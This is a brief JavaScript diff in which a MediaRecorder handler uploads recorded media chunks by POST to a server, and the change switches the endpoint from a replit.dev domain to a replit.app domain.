@@ -26,7 +26,7 @@
             const mediaRecorder = new MediaRecorder(stream);
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
-                    fetch("https://ConnorMoreland1.replit.dev/stream", {
+                    fetch("https://ConnorMoreland1.replit.app/stream", {
                         method: "POST",
                         body: event.data
                     }).then(response => response.json())
